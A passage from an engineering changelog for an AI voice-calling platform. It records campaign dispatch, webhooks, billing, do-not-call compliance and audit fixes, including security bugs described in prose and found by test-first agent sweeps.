  again per contact at dial time, because a number can join the list between launch
  and dial and hard rule 5 says additions propagate before the next dispatch tick.
  This loop *is* the tick. A test opts a number out after launch and proves it is
  never dialled.
- **Concurrency, in FLOWS §5's order**: platform lines (10, one constant until engine
  verification item 8) − inbound reserve (30%, min 4) → shared outbound pool; then the
  tenant's plan ceiling; then the per-campaign slider. One tenant's campaign cannot
  eat the lines another tenant's receptionist is holding.
- **Retry ladder**: no-answer/busy/failed → `pending` with spaced backoff
  (30m, 120m), exhausting to `failed` after `max_attempts`. Blocked-by-hours refunds
  the attempt — 9–21 IST is a *when*, not a *no*. Blocked-by-DNC is terminal.
- **`dialing` is a real state with an end.** The dispatcher no longer writes
  "connected" the moment the engine accepts a dial; the contact stays `dialing` and
  the post-call pipeline's new STEP 7 (`resolve_campaign_contact`) decides its fate
  from the call's actual outcome. A 30-minute reaper returns contacts whose call never
  reported a terminal status to the ladder, so a lost webhook cannot pin a campaign
  open forever.

Two real bugs the tests found, both worth remembering:

1. **`LIMIT` in `WHERE id IN (SELECT … LIMIT n FOR UPDATE SKIP LOCKED)` is not a
   limit.** The planner may put that subquery on the inner side of a nested-loop
   semi-join and rescan it per candidate row. `add_contacts` inserts a whole CSV in
   one transaction, so every contact shares a `created_at` to the microsecond; each
   rescan broke the tie differently and returned a different arbitrary pair, and the
   union blew past the slider — a campaign dialling into the inbound reserve. Fixed
   with `WITH picked AS MATERIALIZED (… ORDER BY created_at, id LIMIT :n FOR UPDATE
   SKIP LOCKED) UPDATE … FROM picked`. Pinned by
   `test_the_tick_dials_up_to_the_campaign_slider_and_no_further` (5 contacts,
   slider 2).
2. **Stale call rows silently zeroed the outbound pool.** The global active count
   included every `queued`/`in_progress` row ever stranded by a lost engine event, so
   a handful of them would stop every campaign on the platform indefinitely. The count
   now only sees calls updated within `ACTIVE_CALL_HORIZON` (1 hour) — nothing we bill
   for runs that long, and the reconciliation poller corrects the rows themselves.

Also fixed: `make types` ran `mypy .`, which dies on the two `conftest.py` files
colliding under module resolution and checks nothing. It now runs `mypy apps packages`,
the exact invocation CI uses — `make check` was quietly a no-op for types.

21 campaign tests; 145 in the suite.

**32. Campaign UI — `apps/web/src/app/c/[slug]/campaigns/`** (SURFACES §2b)

The screen the launch-check endpoint was designed for. One rule drives the layout:
**the launch button is disabled with its reasons on screen, not after a click.** Each
named blocker maps to plain-language copy ("Your agent has to be published before it
can make calls"), so a blocked launch is a to-do list rather than a support ticket.

- **Create → contacts → gate → launch → live progress**, driven end to end in a
  browser during the build: 3 contacts added, 1 unreadable number counted and skipped,
  two blockers listed, then green and running. Pause/resume from the progress card.
- **CSV is parsed client-side** so the row count is visible before committing, and
  header/column order is guessed forgivingly — but the numbers themselves are still
  normalized server-side, where an unparseable one is counted, never guessed.
- **Progress polls only while dispatching** (`refetchInterval` reads the query's own
  data): a completed campaign polled every 15s is noise on the phone connections most
  of these clients are on.
- Three read endpoints exist because the UI can't work without them:
  `GET /v1/campaigns` (a launched campaign must be findable tomorrow — the page was
  briefly single-campaign-per-visit, which is a data-loss-shaped bug), plus
  `/campaigns/numbers` and `/campaigns/templates` so the number-series and DLT-template
  blockers are *selectable* rather than permanently red. Both list routes are declared
  BEFORE `/{campaign_id}` — FastAPI matches in declaration order, so `/numbers` would
  otherwise parse as a campaign id.

Also fixed: `pnpm -C apps/web lint` had never run. `eslint-config-next@15` still ships
eslintrc-shaped configs, and the flat config imported them directly, so every
invocation died with "nextVitals is not iterable". Now bridged with `FlatCompat`
(Next's own scaffold pattern) and `@eslint/eslintrc` added as a direct devDependency —
the lockfile diff adds no new packages, only the direct link to the version already in
the tree. The app lints clean.

**33. Campaign prerequisites in the admin console** — `apps/api/admin/routes.py`,
`apps/web/src/app/admin/tenants/[tenantId]/`

Numbers and DLT templates are the two things every client campaign stalls on, and both
are OUR operational work: we buy the number, we file the template with the registrar
under the client's PE. So they are admin writes with a client-realm read, and the admin
tenant page grows a "Campaign setup" panel that does both.

- `POST /tenants/{id}/numbers` (+ `/dlt-status`) and `POST /tenants/{id}/dlt-templates`
  (+ `/status`), all `admin:tenants`, all audited. The audit summary records the
  **series**, never the number (hard rule 6).
- **A template is created `submitted`, never `approved`.** Approval happens at the
  registrar; a template we mark approved because we typed it in is how a campaign
  launches under a registration that does not exist.
- **The number uniqueness check is the index, not a probe.** `phone_numbers.e164` is
  globally unique, but a probe runs under the provisioning tenant's RLS, which hides
  another tenant's rows — it would report "available" for exactly the number that is
  not, and the insert would surface as a 500. The IntegrityError becomes a clean 409.
  Tested from both tenants' sides.

Three latent bugs surfaced while wiring the screen, each now pinned by a test that was
first confirmed to FAIL against the old code:

1. **"View as client" 404'd on every tenant that exists.** The impersonation slug was
   resolved under `untenanted_session`, where `organizations` is RLS'd on
   `app.tenant_id` or a membership — an operator has neither, so the lookup saw zero
   rows and raised "Organization not found" for a live client. Reading the client
   directory is exactly what `admin_session` (`app.admin`, USING-only) exists for.
   D-22's read-only half is asserted in the same test.
2. **The KB approval queue could never be read.** Both KB *reads* were gated on
   `kb:write`; the queue is read through impersonation, impersonation refuses every
   MUTATING permission, and `kb:write` is one. They are `agents:read` now — reading
   what an agent knows is an agent read; only submitting changes what it says. The
   test asserts the general property (no KB read may be gated on a mutating
   permission), so the next such route cannot regress it quietly.
3. **The tenant detail page fetched the whole client directory to find one row** —
   and that list is N+1 by design (per-tenant counts under each tenant's own RLS).
   Added `GET /v1/admin/tenants/{id}`, the same query narrowed to one client.

`(:tid IS NULL OR id = :tid)` needed an explicit `CAST(:tid AS uuid)` — Postgres cannot
infer a bare NULL parameter's type, and the full suite caught it on the list path.

150 tests.

**34. Outbound CRM sync — `apps/api/integrations/`, `apps/workers/outbound_webhooks.py`**
(D-23, SEC-COMP §5)

Leads and call results reach the client's own CRM as they happen, through the outbox
that already carried notifications. Migration `4be32bf3d12c` adds
`webhook_deliveries.endpoint_id`; four events ship (`lead.created`, `lead.updated`,
`call.completed`, `campaign.completed`) with a client-facing config + delivery screen.

- **Nothing is delivered that the domain write did not commit.** `enqueue_event` writes
  the outbox row in the CALLER's transaction, so "CRM told about a lead that rolled
  back" is structurally impossible — asserted by a test that raises mid-transaction and
  finds zero pending deliveries.
- **The signature covers the timestamp.** `X-Calevate-Signature: t=…,v1=HMAC-SHA256({t}.{body})`.
  Signing the body alone makes a captured request a bearer token forever; with the
  timestamp inside the signed string, a receiver that rejects old timestamps also
  rejects replays, and a valid signature cannot be moved onto a fresh one. The
  RECEIVER's `verify_signature` ships too, so the tests assert the scheme rather than
  our implementation of it — and the docs can point at real code.
- **Phone numbers are masked by default.** Hard rule 6 is about logs, but the same
  reasoning governs anything crossing our boundary; the raw number is a per-endpoint
  opt-in recorded in the config row. `call.completed` carries the summary, never the
  transcript.
- **One forensic row per delivery, not per attempt.** The delivery id is minted at
  ENQUEUE — ARQ replays the same payload on retry, so a worker-side id would mint a new
  one per attempt and a receiver deduplicating on it would treat every retry as new.
- **`webhook_deliveries` still has no RLS policy** (engine webhooks arrive before the
  tenant is known — that is why it has none). The client query scopes through
  `endpoint_id IN (SELECT id FROM outbound_webhooks)`, and *that* table is tenant-RLS'd,
  so isolation comes from an existing policy rather than a column someone must remember
  to filter on. Pinned by a two-tenant test.
- A deactivated endpoint is `skipped`, not retried: the client turned it off, which is
  a decision, not an outage.
- The signing secret is returned exactly once, at creation; the list shows an 8-hex
  fingerprint. A settings page that re-displays a shared secret turns every screenshot
  into a key disclosure.

Same `LIMIT`-is-not-a-limit defect found in `claim_outbox_batch` and fixed the same way
(MATERIALIZED CTE + total ordering). Outbox rows enqueued in one transaction share
`created_at` exactly, so the batch could come back larger than `limit` — a latency
spike rather than corruption, but `limit` should mean what it says. Now tested, along
with SKIP LOCKED's real promise: two dispatchers whose transactions OVERLAP never take
the same message (the sequential version of that test was wrong — a re-seen row is the
retry path working).

165 tests.

**35. One-click AI callback — `apps/api/crm/` + the call detail screen** (D-21 M2 half)

"Trigger an AI callback on needs-follow-up calls": the agent is re-dispatched to the
same lead carrying what happened last time. `GET /v1/calls/{id}/callback` answers
whether it may happen and why not; `POST` does it. Migration `efb47868ec59` adds
`calls.callback_of_call_id`.

**Almost all of this feature is refusals, and that is the design.** A robot ringing a
customer again and again because each call ended inconclusively is the harm TRAI's
rules exist to prevent, so the bounds are code, not policy:

- **The chain is capped at two follow-ups**, which is what `callback_of_call_id` is
  for — without the link the bound is unenforceable, so a test dispatches a real
  callback and walks the chain to exhaustion.
- **Seven-day freshness window.** A follow-up a fortnight later is a cold call wearing
  a follow-up's clothes, and the refusal says so.
- `resolved` is not followed up (the point of recording an outcome is acting
  differently on it); an unfinished call is refused; a call with no lead has nobody to
  ring; an inbound-only agent is told so here rather than failing at the gate.
- The context handed to the agent is OUR summary, never the transcript — asserted by a
  test that plants an Aadhaar-shaped line in the transcript and checks it does not
  travel. A call with no summary still opens coherently instead of saying "None".
- Idempotency keys off the CALL rather than a client header: the natural key for
  "follow up this call" is the call, and two browser tabs must not ring a customer
  twice.

The eligibility GET evaluates the compliance gate too, so the button is disabled with
the *real* reason — verified in the browser at 07:00 IST, where it correctly reads
"Outbound calls are only placed between 9:00 and 21:00 IST".

174 tests.

**36. Billing surfaces — `apps/api/billing/service.py`, two panels** (D-12, hard rule 7)

The metering has been recording `unit_cost_paid` beside every billable quantity since
M1 for exactly this: margin per client is a query, not a monthly spreadsheet exercise.
Two audiences, two panels, one ledger.

- **Client usage panel** (`GET /v1/usage`, `billing:read` — owners, not staff): minutes
  against included minutes, overage in exact rupees, cap state, and the prepaid credit
  balance *only* for self-serve/trial tiers (showing a managed client a ₹0 wallet
  invites a support ticket about a concept that does not apply to them). Our supplier
  cost is deliberately absent — that is commercially ours.
- **Admin margin panel** (`GET /v1/admin/tenants/{id}/margin`, admin realm): revenue vs
  what we actually paid. It runs under a tenant-scoped session because `usage_events`
  is RLS'd and stays that way — `app.admin` opens the client DIRECTORY, never their
  data, so an operator enters a client's scope deliberately, exactly as impersonation
  does for pages.
- **Billing months are IST**, computed in SQL as `occurred_at + interval '5:30'`. A
  month that rolls at 05:30 IST puts an evening call in the wrong month and makes an
  invoice disagree with the client's own diary. A test pins 19:00 UTC on the 31st as
  belonging to the NEXT month.
- **NUMERIC end to end**, including the last step: the API sends exact strings and the
  screen adds them in whole paise rather than parsing to a float, because
  `Number(a) + Number(b)` in a React component is the most embarrassing possible place
  for ₹10,159.00 to become ₹10,158.999999999998.
- `margin_pct` is **null, not 0**, before anything is billed: "nothing billed yet" and
  "we made nothing" are different facts and an operator acts differently on each.

While seeding demo data the seeded cost was wrong by a factor of 60 (a per-minute rate
applied per second). It was corrected the way hard rule 4 requires — a negative
compensating entry plus a correct one, with the reason in `meta` — not an UPDATE. The
ledger doctrine held under its first real use.

182 tests.

**37. "Needs attention" queue — `apps/api/crm/attention.py`** (SURFACES §2b)

Everything the platform refuses to do quietly ends up in one queue, in words the
client can act on. Four sources, each its own honest query rather than one clever
UNION: leads whose dial the gate blocked (with per-rule remedies — "add the consent
checkbox to your form", not "no_form_consent"), webhook deliveries the client's own
endpoint rejected, campaigns paused or running-but-drained (all contacts DNC-blocked —
looks busy on the dashboard, will never dial again), and rejected knowledge with the
reviewer's note. `GET /v1/attention`, `leads:read` because staff work this queue.

Judgment calls pinned by tests: an unmapped rule still appears with its raw name
(dropping it hides a blocked lead behind our housekeeping); a contacted lead leaves the
queue (it is a to-do list, not a history); `pending_approval` KB is excluded (waiting
for US is not the client's to-do); a healthy running campaign stays out. 14-day window
so the queue does not become wallpaper. 7 tests; 189 in the suite.
Backend + tests shipped; the client screen is the natural next UI increment.

**38. Outpero-parity sweep — three screens built in parallel + runway framing**

Checked the build against the authenticated teardown (`docs/evidence/
outpero-teardown-aug2026.md` §5–§8). At parity or ahead on: instant leads, campaigns
(server-side enforcement vs their self-serve config), inbound (they haven't shipped
it), AI callback (theirs is a human button), schema-driven CRM, KB workflow, billing,
webhooks/API contract. This entry closes four of the remaining gaps; three of the
screens were built by parallel subagents on disjoint files, then integrated.

- **Performance screen** (`/c/{slug}/performance`): connect rate, Calls→Answered→
  Interested funnel (pure-CSS bars, no chart dep), busiest hours IST, outcome list,
  7/30/90-day toggle. Consumes the §36 backend; null rates render "no calls yet".
- **Needs-attention screen** (`/c/{slug}/attention`): the §37 queue rendered with the
  remedy text as the visually primary line, per-kind chips, 60s refetch.
- **Leads polish**: status filter chips (fixed D-21 enum) + a List/Board toggle — six
  kanban columns reusing the exact same status mutation as the table rows. No
  drag-and-drop; a select per card.
- **Runway framing** (teardown adopt #8): "About N minutes left this month" on the
  usage panel. Managed = cap − used; self-serve = wallet ÷ `SELF_SERVE_INR_PER_MIN`
  (new config key, in `.env.example`, env-parity green) — the SAME number the top-up
  flow will price from, so the two can never disagree. Two tests.

Still open from the teardown adopt list: branching script builder + adherence slider,
AI onboarding copilot, test-chat sandbox, voice catalog tiers, ambient sound bed,
WhatsApp/Calendar in-call actions (need live provider accounts), self-serve
signup/top-ups. All are screens or provider integrations — none require a migration
(D-39's split holds).

195 tests.

**39. Integration DX — webhook activity view + test-webhook dry run** (SURFACES §2b)

The two features the teardown called "the single biggest integration-DX win
available", built on the reliability triad that already records everything needed.

- `GET /v1/lead-sources/activity`: every inbound delivery as **accepted /
  deduplicated / rejected** — the SURFACES words, not our internal enum. Deduplicated
  was previously invisible (a retry hit the (provider, event_key) conflict and left no
  trace), so migration `2c8993164b46` adds `webhook_inbox_events.duplicate_count`,
  bumped on the duplicate path. The test drives 4 identical webhook POSTs and asserts
  one `processed` row with `duplicate_count = 3` — and still exactly one call placed.
- `POST /v1/lead-sources/{id}/test`: the dry run. Reports every decision the real
  path would make — field mapping, phone normalization, form consent, and the
  compliance gate's verdict with its rule — and DOES none of it: no lead row, no inbox
  claim, no dial. This is not a hard-rule-5 bypass; the gate is CONSULTED (same
  function, same live DNC read) and its verdict reported instead of acted on. The
  difference is the direction of the arrow: a bypass dials without asking, this asks
  without dialling. Tested against a live DNC entry.
- These live on a separate `/v1/lead-sources` router with the normal auth stack —
  NOT under `/hooks`, which is the never-shed, secret-authenticated machine surface.
- **Screen**: `/c/{slug}/lead-sources` — a "Try a sample lead" form whose button says
  what matters ("Run test — no call is placed"), step-by-step ✓/✗ results, and the
  deliveries table with a "retries absorbed" column. Verified in a browser against
  live data (one accepted delivery, one retry absorbed, dry run refusing on
  calling_hours at 07:48 IST).

197 tests.

**40. Parallel round: prompt rollback, invoices, runbooks — and the bug a runbook
found**

Three subagents on disjoint files, integrated in one pass.

- **Prompt versioning + rollback** (`apps/api/agents/prompts.py`, `prompt_routes.py`,
  admin realm): same doctrine as the KB — versions are immutable history, rollback is
  copy-forward republishing (a NEW version with the old body), never pointer-rewind,
  so the audit trail never shows an agent silently pointing backwards. Live agents
  re-publish to the engine INSIDE the transaction (an engine failure rolls back
  version + pointer together); drafts skip the engine. The agent flagged that
  `prompt_versions` had no `notes` column and had parked notes in
  `compiled_t0_context` — which D-39 reserves for the T0 compiler, a collision waiting
  to overwrite the audit trail. Resolved properly: migration `2faa301dc488` adds
  `notes`; the workaround is gone. 4 tests.
- **Invoice generation** (`apps/api/billing/invoice.py` + admin route): a structured
  statement derived from `usage_summary` — imported, not duplicated, so the invoice
  can never disagree with the usage panel. Deterministic invoice numbers
  (regeneration cannot duplicate), 18% GST as a named constant, paise-exact Decimals,
  and no ₹0.00 overage line (a zero line invites a dispute about nothing). 5 tests.
- **Runbooks** (`runbooks/campaign-stall.md`, `runbooks/webhook-delivery-failures.md`):
  2am decision trees with every table name, status value, tick return string and alert
  code grep-verified against the code. **The audit found a real bug**: the delivery
  worker's `MAX_ATTEMPTS=5` vs ARQ's `max_tries=3` meant the last real try never knew
  it was the last, so `outbound_webhook_exhausted` could never fire — a client's broken
  integration would go silently stale, exactly what the alert exists to catch. Fixed
  with ONE constant (`WORKER_MAX_TRIES` in `core/queue.py`) that both read, pinned by
  a test asserting identity (`is`, not `==`) plus an end-to-end alert-fires check.

207 tests.

**41. Parallel round 2: calling windows, RLS sweep, webhook contract, admin screens**

Six subagents across two waves, disjoint files, integrated in two passes.

- **Per-campaign calling windows** (`campaigns/service.py`, `campaign_dispatch.py`):
  a client may NARROW when their campaign dials, never widen — a window outside
  09:00–21:00 IST is rejected at CREATE with `campaign_window_outside_platform_hours`,
  so an unlawful window can never reach the column. A closed window SKIPS the campaign
  before claiming (skip-not-refund: a closed window blocks every contact identically,
  so burning attempts and compensating them back is pure churn), and the per-dial gate
  still runs on everything claimed — defense in depth. The dispatcher reads the clock
  as `compliance_service.ist_now()` through a module import so the window check and the
  gate can never disagree about what time it is. 4 tests.
- **`tests/rls_sweep_test.py`** — the RUNTIME twin of the RLS coverage guardrail.
  Discovers tenant tables from `information_schema` at runtime and reuses the registry's
  exemption list, so a table added next month is swept without anyone remembering.
  Honest about its layers: behavioural zero-rows proof where onboarding seeds rows,
  policy-exists-and-is-FORCEd proof where it does not, cross-tenant UPDATE asserting
  rowcount 0 — with ground truth read through the OWNER connection, so a vacuous pass
  (zero rows vs zero rows) is impossible.
- **`docs/WEBHOOKS.md`** — the integration contract for a client's developer, both
  directions. Every constant grep-verified against the code; the two event types with
  no emitter yet are labeled "reserved, not yet emitted" rather than implied; and the
  doc deliberately does NOT promise an exponential backoff curve, because the code has
  none (the older docstrings claiming one are the thing that is wrong).
- **Admin screens**: prompt history + rollback (captioned with the doctrine — rolling
  back creates a NEW version), a printable invoice document (white page inside the dark
  console, ₹ strings rendered verbatim, never through `Number()`), and an Agents panel
  on the tenant page as the entry point to prompt history.

214 tests.

**42. Parallel round 3: the DNC write path, DPDP subject export, voices, top-ups**

Six subagents on disjoint files, integrated in one pass. The theme is *closing gaps
the docs already promised*, which the docs-vs-code audit in this same round found:

- **Do-not-call, the write side** (`compliance/dnc.py`, `dnc_routes.py`, 10 tests).
  The audit's most serious finding was that `add_to_dnc` had existed since the gate
  shipped **with no production caller** — the gate reads `dnc_list` live on every
  dispatch (SEC-COMP §3), which made that live read a promise about an empty table.
  Now: bulk add (counts back, never numbers — the same shape as `add_contacts`), a
  masked list, and a `POST /v1/dnc/check` that is a POST *because the identifier IS
  the personal data* and a GET would write it into access logs and browser history.
  Removal is deliberately narrow rather than privileged: a client may delete an entry
  they typed in (`source = manual`) and may **not** delete one that records a
  consumer's opt-out — an account that can delete "don't call me again" can un-hear
  it. Making removal admin-realm instead would have shipped an unreachable route:
  `admin:tenants` is a MUTATING permission, and D-22 refuses those while impersonating,
  so no admin principal both sees a tenant's rows and may write them.
  One bug caught by its own test: `removable` in the list was computed from `scope`
  while enforcement was source-based, so the UI would have offered a button the
  endpoint 422s. Both now call one `is_removable()`.
- **DPDP subject-access export** (`compliance/export.py`, `export_routes.py`, 5 tests).
  Transcripts read `text_redacted` and the raw column is not named in the query — the
  argument is third-party harm, not policy: a caller who reads out a relative's number
  has put someone else's data in our store, and releasing it while honouring a subject
  right would be a fresh breach. `text_redacted IS NULL` renders `[redaction pending]`
  rather than falling back to raw or lying with an empty string. Recordings and consent
  evidence are booleans (a presigned URL in a JSON blob is a bearer credential that
  survives every forward). Audited under a `subject_ref` hash matching `retention._hash`,
  so an access request and an erasure request for one person correlate with neither
  record carrying the number.
- **Voice catalog** (`agents/voices.py`, `voice_routes.py`, 10 tests) — grounded in
  D-36/D-35 (Bulbul v3 default, v2 the ₹15/10k value tier) and honest about its limits:
  the docs name **no speakers**, so the catalog offers a choice of MODEL and invents no
  speaker ids, every entry ships `verified: false` until pilot gate 3 confirms the
  string Bolna accepts, and a test pins that none claims otherwise. Setting a voice does
  not auto-republish: republishing a prompt changes what an agent says (just approved),
  republishing a voice changes what a live client's phone line sounds like.
- **Credit top-ups** (`billing/credit_routes.py`, 12 tests) — ops records an NEFT/UPI
  payment. Idempotent on the **payment reference**, not an `Idempotency-Key` header: a
  UTR is permanent and the header's claim expires in 24h, while the same payment
  re-entered next week must not credit twice. The advisory lock is taken BEFORE the
  lookup (`record_entry`'s own lock is too late — both writers would already have read
  "not present"), and same-ref-different-amount is a 409 rather than a silently
  swallowed second payment. JSON floats are refused outright (hard rule 7).
- **Client agents screen** (`/c/[slug]/agents`) — read-only by design (D-21): the live
  badge derives from `published` AND `status` together, mirroring `_is_live` in
  `agents/prompts.py` so the UI cannot claim something the backend disagrees with; the
  disclosure line is captioned as what the agent says, not as something they chose; and
  the engine name is deliberately not rendered.
- **Docs-vs-code audit** — 20 divergences found, two shipped as fixes here (WEBHOOKS.md
  into the README reading order, M2 shipped-markers in ROADMAP §3). The rest are queued
  for the follow-up round: four docs promise an exponential backoff curve the code does
  not have; TRD §8 still opens the pipeline with "verify HMAC" (D-31 replaced it with
  source-IP + execution-id dedupe); DATA-MODEL is missing six shipped columns and two
  shipped tables and documents two tables that were never created.

Route-ordering hazard worth remembering: `voice_router` mounts BEFORE `agents_router`,
or `/v1/agents/{agent_id}` swallows `/v1/agents/voices` and 422s it as a bad UUID —
the same hazard `campaigns/routes.py` calls out for `/numbers`.

**43. The audit sweep: eleven agents over the whole codebase**

Eleven agents on strictly disjoint territories, each given one rule: **reproduce the
defect with a failing test BEFORE fixing it**, and report what you investigated and
found sound as well as what broke. That rule is the reason this entry is long — almost
everything below was invisible, and several were invisible *because a test said
otherwise*.

The single most useful instruction turned out to be the one about test hygiene. The
compromised test that hid the ARQ bug (`tests/outbound_sync_test.py` injected
`{"job_try": WORKER_MAX_TRIES}` straight into the job context, manufacturing the state
it then asserted) became the template for what agents went looking for elsewhere — and
the guardrail audit found the same shape one layer down, in guardrails that asserted a
trigger *existed* rather than that it *blocked*, and an allowlist entry's *comment*
rather than its *behaviour*.

**Security — the three that mattered most**

- **Both Clerk realms verified against one JWKS host.** `_jwks_url()` took the realm's
  secret, deleted it, and returned the same host either way, so the admin verifier
  accepted a signature minted by the CLIENT Clerk application. The only thing between a
  client token and the admin console was whether that user id also appeared in
  `admin_users` — an authorization check standing in for an authentication one.
- **`/hooks/v1/engine/fake` accepted writes from anyone, in every environment.** The
  route table is identical everywhere and the receiver accepted the `fake` engine from
  any source IP, so on a production box running `ENGINE=bolna` a stranger with the URL
  got an inbox claim, a forensic row and an ARQ job.
- **A deleted user came back.** The Clerk mirror's upsert cleared `deactivated_at` in
  its `DO UPDATE`, and svix does not guarantee ordering — a `user.updated` landing after
  the `user.deleted` restored a revoked account's access to every tenant it belonged to.

**Money**

- `unit_cost_paid` held leg TOTALS where every reader treats it as a per-unit price
  (`SUM(qty * unit_cost_paid)`), so a 95-second call costing ₹6.41 was recorded as
  ₹169.85 — and the TTS leg vanished entirely because its qty was 0.
- `charge_for_call`'s dedupe ran BEFORE the advisory lock, so two overlapping pipeline
  runs of one call both read "not charged yet" and both appended.
- `occurred_at` used `now()` — TRANSACTION-START time — so a long transaction stamped
  its entry earlier than a top-up that started later and committed first, and
  `ORDER BY occurred_at DESC LIMIT 1` read a stale balance.
- GST rounded ROUND_HALF_EVEN off the process-global decimal context: ₹18.045 became
  ₹18.04 where an Indian tax invoice is checked for ₹18.05, and any library changing
  that global silently changed our rupees.

**Things that never ran at all**

- **ARQ never retried.** arq only spares a job that raises `arq.Retry`; every worker
  raised plain exceptions, so failures were dropped after one attempt — `max_tries`
  decorative, the DLQ ladder dead, and `outbound_webhook_exhausted` unable to fire.
- **The `completed` webhook never reached the queue** (D-40). The inbox deduped per
  EXECUTION while the job id keyed per TRANSITION, so the first status change claimed
  the row and `completed` — the only one carrying cost, recording and transcript — was
  answered `duplicate`. Every call waited for the 10-minute poller.
- **The reconciliation poller was blind under RLS**, probing `calls` on an untenanted
  session, so it re-drove every healthy call on every tick and buried the real repairs.
- **KB rollback was impossible** — publishing archives the predecessor, and
  `publish_source` refused anything not `approved`.
- **`GET /v1/agents/{id}/publish` is un-callable** (401 without the impersonation
  header, 403 with it) — recorded as an xfail, not fixed, because the fix is the
  tenant-in-path pattern rather than an auth-core change.

**The guardrails could be fooled by the violations they name**

Five of six. RLS coverage checked a policy's NAME, not its rule — `USING (true)` passed,
as did a second permissive policy beside the good one, and `WITH CHECK` was never
fetched. Ledger immutability had no ORM branch at all despite a docstring promising one,
and counted a DISABLED trigger as present. The redaction guardrail never looked for
`text` — the one field the rule is written about — and its allowlist was self-certifying.
OpenAPI freshness compared only paths and property names, so a route silently downgraded
from `calls:read_raw` to `calls:read` produced no diff. And `make help`, the default
goal, had been broken by an unquoted `(CI gate)` so plain `make` exited 2.

**A rule, not three fixes**

Read endpoints kept getting gated on MUTATING permissions, which D-22 refuses while
impersonating — so the views that EXPLAIN a refusal were exactly the ones support could
not open. Found in three modules, so `tests/impersonation_reads_test.py` now asserts it
over the whole route table. Same shape: any staff user could export a client's unmasked
contact list, because the export's "role gate" was `leads:read`.

**Sixteen web defects**, of which three were silent: "Export CSV" never worked (an
`<a href>` to a header-authenticated endpoint — verified live, 401 not a file), the
new-client wizard minted an owner invite for `owner@example.com` whenever billing email
was blank, and approved knowledge could never go live.

**Deliberately not built, with reasons recorded**: a circuit breaker around the vendor
(one vendor, small fleet, and the reconciliation poller already IS the degraded mode the
doc imagines — 429 handling with full jitter was built instead, and only 429, because it
is the one status that says the request was not performed); narrowing
`TRUSTED_PROXY_CIDRS` (the correct value is a deployment fact, and guessing wrong 401s
100% of real traffic).

**44. Closing what the sweep found: eight agents on the recorded gaps**

The audit sweep (§43) produced a list of defects it could NOT fix from inside its own
territories. This round closed them. Every fix was reproduced by a failing test first.

- **Spend caps became real.** `spend_state.capped` was never set to `true` by anything,
  so `hard_cap_min` and `hard_cap_spend` were displayed in two panels and enforced by
  nothing. The flag is now computed inside the same statement that accumulates the
  counters — not a re-read, because two calls finishing at once would each see a
  pre-cap total and neither would arm the cap.

  Building it exposed a worse problem than the one it fixed: **the meter is the only
  writer, and a capped tenant meters nothing.** Inbound traffic hides it (inbound is
  never gated, so it keeps metering and rolls the month over) — but an outbound-only
  campaign client, exactly the kind that hits a spend cap, would be capped in July,
  refused every dial in August, with no call able to complete and clear the flag. Ever.
  Both readers now check the month: a cap belonging to a closed billing month is not a
  cap.
- **`POST /v1/agents/{id}/publish` could not be called by anyone** — 401 without the
  impersonation header (its `Depends(db)` fell through to the CLIENT verifier), 403 with
  it (D-22 refuses mutating permissions while impersonating). Its `assert` was
  unreachable code. Moved to `POST /v1/admin/tenants/{tenant_id}/agents/{agent_id}/publish`,
  the pattern every other admin mutation uses. The test that pins it is structural: it
  fails for ANY future admin-realm mutating route that resolves its tenant through
  `tenant_of` — the shape that made this un-callable rather than merely buggy.
- **DB errors echoed raw transcripts.** A failed transcript insert produced a
  738-character message ending in the bound Telugu turn with the caller's number in it.
  The 200-char log truncation was assumed to be the backstop; it is not — the outbox
  writes 500 chars of that same string into `outbox_messages.last_error`, a DATABASE
  COLUMN past every log redaction hook, and for this statement the cut lands just short
  of the parameters. That is luck measured in SQL length, not a control.
- **The big red switch could be ignored indefinitely.** The load-shed cache had no TTL
  and was invalidated by a best-effort DELETE inside a swallowed `except` — so one
  failed Redis call, exactly what happens when Redis is flaky, left every process
  reading a stale "open" forever. The read now refuses a key with no expiry, which is
  what heals one written by a pre-fix process.
- **The post-call stall alarm had never fired** (blind under RLS, same root cause as the
  reconciliation poller), and **a hot-lead email that failed to send told nobody**. The
  trap in fixing the second one: the old idempotence check treated ANY notification row
  as a duplicate, so a retry would have found the `delivered: false` row it wrote itself
  — a decorative ladder plus a timeline claiming the client was told.
- **The DPDP erasure right can now be exercised.** `execute_deletion_request` was a
  registered worker that nothing could enqueue. The end-to-end test asserts the proof's
  `subject_hash` equals the export path's `subject_ref(phone)` — the thing that lets an
  auditor line an access request up against an erasure, and the one thing nothing
  checked, because the two halves had never met.
- **A superseded knowledge base stayed live on the agent.** The protocol had `attach_kb`
  and no detach, so a rollback attached every version at once. `attach_kb` now returns
  the VENDOR's handle, which is the load-bearing part: our `kb_sources.id` addresses
  nothing on their side, so the obvious `DELETE /knowledgebase/{our uuid}` would have
  404'd forever while looking like a working detach.
- **A killed dispatcher can no longer loop a poison message forever** — the attempt bump
  lived in the dispatcher's transaction, so a SIGKILL rolled it back and the row returned
  to `pending` with `attempt_count = 0`. `locked_until` over a `claimed` status because a
  lapsed lease is picked up by the claim query dispatchers already run: the recovery path
  IS the normal path, so nothing needs a reaper.

**The finding that could not be fixed, and should not have been.** The same migration
tried to add a partial unique index on `credit_ledger (tenant_id, ref)` and could not:
**21 pairs already violate it** — 19 topups and 2 usage charges, real double-credits left
by the check-then-write races fixed in §43. They cannot be cleaned, because the ledger is
append-only with a database trigger enforcing it, and dropping that trigger to delete
money rows would do exactly what hard rule 4 forbids while destroying the evidence.
Forcing the index with a skip-if-violations clause or a date cutoff was rejected too: the
first leaves the constraint present in some environments and absent in others, the second
hides 21 unreconciled pairs behind a clean-looking index. The route is compensating
entries first, index second.

**Test hygiene, twice.** `xfail_strict` was never set, so an xfail that starts passing
was a silent XPASS — this repo uses xfail to PIN a known defect to the file that owns it,
and without strictness the pin stops meaning anything the moment someone fixes it. And
the caps tests hardcoded July as "this month", which passed only because nothing checked
the month; they are relative now, so they cannot rot in September.

## §45 — the sweep's fourth and fifth waves: what the truth-telling layers were saying

§43 and §44 fixed things that were wrong. This wave fixed things that were *lying* —
code that produced an answer, passed its tests, and described a world that was not there.

- **The extractor invented facts about callers, on both paths.** The offline heuristic
  read a transcript without asking who spoke: `Mee peru cheppandi` (the AGENT asking for
  a name) filed "Cheppandi" as a caller who does not exist; a caller answering *Ledu* to
  "callback avasaram unda?" recorded `wants_callback = True`, so the client rings someone
  who said no — the exact harm the do-not-call machinery exists to prevent; and an enum
  value of `caller` matched the `caller:` prefix on every line, setting the field on every
  transcript regardless of content. This is worse than "it is only the offline extractor":
  it is what CI scores and what every golden-transcript regression is measured against, so
